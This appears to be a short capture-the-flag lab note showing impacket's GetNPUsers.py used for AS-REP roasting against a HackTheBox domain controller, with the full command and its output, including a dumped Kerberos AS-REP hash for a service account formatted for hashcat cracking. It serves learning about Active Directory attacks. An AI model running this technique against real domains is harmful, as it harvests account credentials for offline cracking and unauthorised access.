# Using GetNPUsers.py of impacket tool for [AS-REP Roasting](https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/) (to get TGT hash)
`GETNPUsers.py` is used to query target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking.
Using `GETNPUsers.py` to get TGT hash.
```bash
❯ python3 GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/' -format hashcat
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2021-07-27 13:38:11.210929  2019-09-23 16:09:47.931194  0x410200



$krb5asrep$23$svc-alfresco@HTB.LOCAL:4f60c362d3d5c16401891d90fade9548$4fbea99781491d2635b13948e0b6a0c949c125a480b3f41acb7191726d5e21cd3347b427ff0b9d72cf0d4f582bb4a60cf6f7ee6d39b69a43035e9376126de14e3a89906e6068f73f69adc3acdca591a194d907ef259373fe755b60e1a89ee183945e895c6a9a0f0cd015db45ca871eaf7ed98c2ad1b854fe9a9b92c950b25d50f83ad98b74f64e026f85c05152d5d98cde57480c2a5ba21ba80a648a0902fa91f9712715991fc35f73b343f8c698a1969934f6fa1b37ca4d7d875348b12e255a76d24a2341564b8580e961db3bb78fd01c78e87835af29a536e871b924cca3ee515bcf6376ba
```
